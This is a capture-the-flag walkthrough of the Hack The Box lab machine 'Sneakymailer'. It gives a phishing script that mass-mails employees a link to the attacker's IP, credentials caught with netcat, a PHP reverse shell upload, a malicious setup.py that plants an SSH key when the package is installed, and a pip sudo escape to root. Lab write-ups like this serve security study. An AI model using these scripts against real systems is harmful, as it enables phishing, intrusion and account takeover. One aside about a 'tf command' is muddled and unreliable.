# Hack The Box - Sneakymailer

## This is my writeup and walkthrough for sneakymailer from Hack The Box.

![unknown](https://user-images.githubusercontent.com/36403473/91232091-b803f380-e72e-11ea-9097-71010dfe8f28.png)

## a medium linux machine.
## `Enumeration`
   
#### 1-Nmap 
```
nmap -sC -sV -O 10.10.10.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 12:38 EET
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up (0.34s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: STARTTLS ACL OK UIDPLUS ACL2=UNION IDLE IMAP4rev1 CHILDREN QUOTA THREAD=ORDEREDSUBJECT THREAD=REFERENCES completed ENABLE CAPABILITY UTF8=ACCEPTA0001 NAMESPACE SORT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: ACL OK UIDPLUS ACL2=UNION IDLE IMAP4rev1 CHILDREN QUOTA THREAD=ORDEREDSUBJECT AUTH=PLAIN completed CAPABILITY ENABLE NAMESPACE UTF8=ACCEPTA0001 THREAD=REFERENCES SORT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/18%OT=21%CT=1%CU=44566%PV=Y%DS=2%DC=I%G=Y%TM=5F3BB00
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.24 seconds
```
when i visited `http://10.10.10.179` it redirected me to `http://sneakycorp.htb` i added sneakymailer.htb to my `etc/hosts`
then i discovered the platform.
i found that this platform contains all Company employees mails in `team.php` page  so i extract all this mails from `Html` page online [extract](http://www.emailx.discoveryvip.com/)
and looking to the `nmap` result we found that port 25 is open so that `smtp`  ,so the idea that i have to send phishing mail to all of this mails for this i create python script to send phishing mail 
```
import smtplib 
 

addresslist = ['airisatou@sneakymailer.htb','angelicaramos@sneakymailer.htb','ashtoncox@sneakymailer.htb','bradleygreer@sneakymailer.htb','brendenwagner@sneakymailer.htb',
'briellewilliamson@sneakymailer.htb','brunonash@sneakymailer.htb','caesarvance@sneakymailer.htb','carastevens@sneakymailer.htb', 
'cedrickelly@sneakymailer.htb','chardemarshall@sneakymailer.htb','colleenhurst@sneakymailer.htb','dairios@sneakymailer.htb','donnasnider@sneakymailer.htb',
'doriswilder@sneakymailer.htb','finncamacho@sneakymailer.htb','fionagreen@sneakymailer.htb','garrettwinters@sneakymailer.htb','gavincortez@sneakymailer.htb', 
'gavinjoyce@sneakymailer.htb', 'glorialittle@sneakymailer.htb', 'haleykennedy@sneakymailer.htb','hermionebutler@sneakymailer.htb','herrodchandler@sneakymailer.htb', 
'hopefuentes@sneakymailer.htb', 'howardhatfield@sneakymailer.htb', 'jacksonbradshaw@sneakymailer.htb','jenagaines@sneakymailer.htb','jenettecaldwell@sneakymailer.htb',
'jenniferacosta@sneakymailer.htb', 'jenniferchang@sneakymailer.htb', 'jonasalexander@sneakymailer.htb','laelgreer@sneakymailer.htb','martenamccray@sneakymailer.htb',
'michaelsilva@sneakymailer.htb', 'michellehouse@sneakymailer.htb', 'olivialiang@sneakymailer.htb','paulbyrd@sneakymailer.htb','prescottbartlett@sneakymailer.htb', 
'quinnflynn@sneakymailer.htb', 'rhonadavidson@sneakymailer.htb', 'sakurayamamoto@sneakymailer.htb', 'sergebaldwin@sneakymailer.htb','shaddecker@sneakymailer.htb', 
'shouitou@sneakymailer.htb', 'sonyafrost@sneakymailer.htb', 'sukiburks@sneakymailer.htb','sulcud@sneakymailer.htb', 'tatyanafitzpatrick@sneakymailer.htb', 
'thorwalton@sneakymailer.htb', 'tigernixon@sneakymailer.htb', 'timothymooney@sneakymailer.htb', 'unitybutler@sneakymailer.htb', 'vivianharrell@sneakymailer.htb',
'yuriberry@sneakymailer.htb','zenaidafrank@sneakymailer.htb'] 
 
fromaddr = 'it@sneakymailer.htb' 
 
for address in addresslist: 
    toaddrs  = address 
    TEXT = 'we have a security issue please visit http://10.10.16.120' 
    SUBJECT = 'Security issue' 
    msg = 'Subject: %s\n\n%s' % (SUBJECT, TEXT) 
 
    server = smtplib.SMTP('10.10.10.197',25) 
    server.starttls() 
    server.sendmail(fromaddr, toaddrs, msg) 
    server.quit() 

```
open port 80 to listen 
`nc -lnvp 80`  
waiting and finally  recive data from mails contains his mail, username and password
![recievedmailcredential](https://user-images.githubusercontent.com/36403473/91237371-bc360e00-e73a-11ea-8948-11d3e6743303.png)
```
email=paulbyrd%40sneakymailer.htb&
password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
``` 
i decode this string online 

```
username: PaulByrd

password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht

email: paulbyrd@sneakymailer.htb

```
i tried to login to ftp server by this credential but i failed to login ,i stopped i don't know what to do
so one of my friend give me a hent.</br>
Hent was to know what microsoft lookup.

So I searched to find a similar package for Linux in this link you will know all package [linux mailer ](https://itsfoss.com/best-email-clients-linux/).
i installed  `evolution`.
i login successfully  

![evolution](https://user-images.githubusercontent.com/36403473/91236339-f5b94a00-e737-11ea-922d-3cfc5e96c6fe.png)

I found mail from PaulByrd asked admin to change his name and password 
`Hello administrator, I want to change this password for the developer account`
so now i have credintial to login ftp server. 
![ftp-connectd](https://user-images.githubusercontent.com/36403473/91236909-7b89c500-e739-11ea-8176-2c7bb1970b56.png)
so i downloaded all ftp server files on my pc to explore it comfortably by this command 
`wget -r -l 10 --ftp-user='developer' --ftp-password='m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C' ftp://10.10.10.197/`
![download-server-file](https://user-images.githubusercontent.com/36403473/91238766-17b5cb00-e73e-11ea-9e42-462e426b7f11.png)

I found the path to the dev file i tried to to upload reverse shell to ftp server by curl command but it didn't work so i used `filezilla` to upload revese shell freerly. 

![filezella](https://user-images.githubusercontent.com/36403473/91237690-93624880-e73b-11ea-8283-929a0ff9f91d.png)

I uploaded python reverse shell but it doent work so i grep php reverse shell from  
[pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)  and uploaded it to server and get access to server.

![connected-shell](https://user-images.githubusercontent.com/36403473/91237952-35823080-e73c-11ea-9654-b8b8da9de16f.png)

The first steps I always take are converting shell to full tty shell
```
    /usr/bin/script -qc /bin/bash /dev/null
    Ctrl-Z
    stty raw -echo
    fg
``` 
### 2-user access

after connecting to server I tried to get `usr.txt` but  can't 
![Screenshot from 2020-10-07 17-39-14](https://user-images.githubusercontent.com/36403473/95354773-1e9b3600-08c5-11eb-91e8-26956bf2b9d8.png)
so I took developer privilege his password ` m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`
![Screenshot from 2020-08-19 14-06-50](https://user-images.githubusercontent.com/36403473/95358441-5b692c00-08c9-11eb-9adc-d10aec84d9ed.png)
in `/var/www/` directory I found another subdomain `pypi.sneakycorp.htb`, so i added it to `/etc/hosts` on my machine 
in `pypi.sneakycorp.htb` directory I found `.hpasswd`.<br/>
Firstly, I decrypted the hashed password it was MD5(APR)<br/> 
password after decryption `soufianeelhaoui`<br/>

I now have the privileges to upload my pypi server content
So I had to look for a suitable Pypi Server. </br>
```
The idea is to have a pypi server so that we can upload or modify files, etc. So I looked for ways to upload to the pypi server and use it to take the powers of the user.
```
After searching, I found out how to install pypi server.
[pypi setup](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/)

```
The idea that I had in mind is to add the private ssh private to an empty autherized file, and from there, I can income via ssh and get low privileges.

```

I created a package directory in tmp directory :
```
        __init__.py
    setup.py
    setup.cfg
    README.md
```
setup.py
```
from setuptools import setup ,find_packages
try:
 print ('hello')
 with open('/home/low/.ssh/authorized_keys','w+') as f:
  f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1fuNi1hqodCXMlrRpn0K4SLCwYnAaRs/Tm3HXW0GFNey/91O0xi0w/gmUB+g/+6ueXosZuiXaK0GeHw4rtb6ROuD7+cXhIDO2l0FYZOuvddgtYlsq5Tt2cchryRPJnBAVEbONPTvOBjnt1ucT6XnkjBFpVwOq5tB+ogwoJp66pNOVdGjtvB3gRFGW+dgew9VdK2FEX9+7zJGbieulRF+tV7pcCMer95ExX06A/3C9QA+E4vqsNWwlo46yR4O1ZVbsmDUPOs1p9oZpwjZjLJj4okUEhhbxxafWxdaHKfwaXrw350V5y2wqBy05PlCEdstxljQ9zc/FN3QnPojiCLFpueQ3YvaoCub64jJ5vt3umr9GGwC/Ws4OBO95VtgjpeC2wR1RKEy6Ej2UCFpTqdwgUDpLzfDPl92v4A+U0btowuI0FYzFJ3FcfYabLRpFXb2R73OSwIU1F7UHwML8lSsWLAaCUcgYhuRY7o73+pngmhdCJ93tFfat4hQBMWjuE=')
except :
  setup(
  name="room", 
  version="0.0.1",
  author="deveoper",
  author_email="deveoper@test.com",
  description="A small example package",
  long_description_content_type="text/markdown",
  url="http:/test.com",
  packages=find_packages(),
  classifiers=["Programming Language :: Python :: 3","License :: OSI Approved :: MIT License","Operating System :: OS Independent",],
  python_requires='>=3.6', 
)
 
```
by checking machine ports, I found port `5000` opend in localhost so lets exploit it.</br>
create .pypirc file:

```
[distutils]
index-servers =
  pypi
  room

[pypi]
username: kkkk 
password: kkkk

[room]
repository: http://127.0.0.1:5000
username: pypi 
password: soufianeelhaoui
```

```export HOME=/tmp/python```
to run `setup.py` we should export python enviroment.
![Screenshot from 2020-08-22 02-42-44](https://user-images.githubusercontent.com/36403473/100475972-186b4e00-30ed-11eb-9651-3e16c965d062.png)
now lets run the exploit and login via ssh 
![Screenshot from 2020-08-24 07-04-17](https://user-images.githubusercontent.com/36403473/100479259-591b9500-30f6-11eb-9dfe-c1a43c9c9c53.png)
![Screenshot from 2020-08-24 07-51-55](https://user-images.githubusercontent.com/36403473/100480331-9cc3ce00-30f9-11eb-8238-dfb6e847eeda.png)


### 3-root access
by checking user's privileges ,`low `can run command from `/usr/bin/pip3` 
so we can get pip shell or  revese shell to get root access.
first i tried to make pip shell and it was success.
got it from here  [FakePip](https://gtfobins.github.io/gtfobins/pip/).
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
``` 
by tf Command we can  add news folder and file from file system to TFS Source Control. Need to do check-in before these file can be visible.
i created temporary file and run the exploit 
![Screenshot from 2020-08-24 07-38-46](https://user-images.githubusercontent.com/36403473/100485156-b835d580-3107-11eb-9599-04742cd2bf83.png)
finally pwned 
